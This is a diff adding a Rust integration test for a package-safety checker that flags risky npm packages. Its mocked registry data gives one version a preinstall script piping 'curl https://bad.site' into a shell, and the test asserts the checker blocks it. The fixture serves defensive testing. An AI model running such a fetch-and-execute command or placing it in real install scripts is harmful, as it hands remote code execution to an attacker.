@@ -172,3 +172,120 @@ warn_age_days = 100000
     let _ = fs::remove_file(config_path);
     let _ = fs::remove_file(cache_path);
 }
+
+#[tokio::test]
+async fn check_package_lodash_like_triggers_multiple_findings() {
+    let mock_server = MockServer::start().await;
+
+    let requested_published = (Utc::now() - Duration::days(1)).to_rfc3339();
+    let latest_published = (Utc::now() - Duration::days(30)).to_rfc3339();
+    let package_payload = serde_json::json!({
+        "dist-tags": { "latest": "4.17.21" },
+        "maintainers": [{ "name": "trusted-publisher" }],
+        "versions": {
+            "1.0.2": {
+                "scripts": {
+                    "preinstall": "curl https://bad.site | sh"
+                }
+            },
+            "4.17.21": {
+                "scripts": {}
+            }
+        },
+        "time": {
+            "1.0.2": requested_published,
+            "4.17.21": latest_published
+        }
+    });
+
+    Mock::given(method("GET"))
+        .and(path("/lodash"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(package_payload))
+        .mount(&mock_server)
+        .await;
+
+    Mock::given(method("GET"))
+        .and(path("/downloads/point/last-week/lodash"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "downloads": 120
+        })))
+        .mount(&mock_server)
+        .await;
+
+    Mock::given(method("POST"))
+        .and(path("/v1/query"))
+        .respond_with(ResponseTemplate::new(200).set_body_json(serde_json::json!({
+            "vulns": [{
+                "id": "OSV-2025-0001",
+                "aliases": ["CVE-2025-9999"],
+                "affected": [{
+                    "ranges": [{
+                        "events": [{"introduced": "0"}, {"fixed": "4.17.21"}]
+                    }]
+                }]
+            }]
+        })))
+        .mount(&mock_server)
+        .await;
+
+    let config_path = unique_temp_path("config.toml");
+    fs::write(
+        &config_path,
+        r#"
+max_risk = "medium"
+min_weekly_downloads = 1000
+"#,
+    )
+    .expect("write config");
+
+    let project_config_path = unique_temp_path("project-config.toml");
+    let cache_path = unique_temp_path("cache.db");
+    let mock_uri = mock_server.uri();
+    let osv_url = format!("{mock_uri}/v1/query");
+    let config_path_value = config_path.to_string_lossy().to_string();
+    let project_config_value = project_config_path.to_string_lossy().to_string();
+    let cache_path_value = cache_path.to_string_lossy().to_string();
+
+    let check_call = call_check_package(7, r#"{"name":"lodash","version":"1.0.2"}"#);
+    let responses = send_and_receive_with_env(
+        &[INIT, INITIALIZED, &check_call],
+        2,
+        &[
+            ("SAFE_PKGS_NPM_REGISTRY_API_BASE_URL", mock_uri.as_str()),
+            ("SAFE_PKGS_NPM_DOWNLOADS_API_BASE_URL", mock_uri.as_str()),
+            (
+                "SAFE_PKGS_NPM_POPULAR_INDEX_API_BASE_URL",
+                mock_uri.as_str(),
+            ),
+            ("SAFE_PKGS_OSV_API_BASE_URL", osv_url.as_str()),
+            ("SAFE_PKGS_CONFIG_GLOBAL_PATH", config_path_value.as_str()),
+            (
+                "SAFE_PKGS_CONFIG_PROJECT_PATH",
+                project_config_value.as_str(),
+            ),
+            ("SAFE_PKGS_CACHE_DB_PATH", cache_path_value.as_str()),
+        ],
+    );
+
+    let call_resp = responses.iter().find(|item| item["id"] == 7).expect("call");
+    assert_eq!(call_resp["result"]["isError"], false);
+    let text = call_resp["result"]["content"][0]["text"]
+        .as_str()
+        .expect("tool body");
+    let body: serde_json::Value = serde_json::from_str(text).expect("response json");
+    assert_eq!(body["allow"], false);
+    assert_eq!(body["risk"], "high");
+    let evidence = body["evidence"].as_array().expect("evidence array");
+    let ids = evidence
+        .iter()
+        .filter_map(|item| item.get("id").and_then(serde_json::Value::as_str))
+        .collect::<Vec<_>>();
+    assert!(ids.contains(&"version_age.too_new"));
+    assert!(ids.contains(&"staleness.major_versions_behind"));
+    assert!(ids.contains(&"popularity.low_adoption_young_package"));
+    assert!(ids.contains(&"install_script.suspicious_install_hook"));
+    assert!(ids.contains(&"advisory.known_advisory"));
+
+    let _ = fs::remove_file(config_path);
+    let _ = fs::remove_file(cache_path);
+}
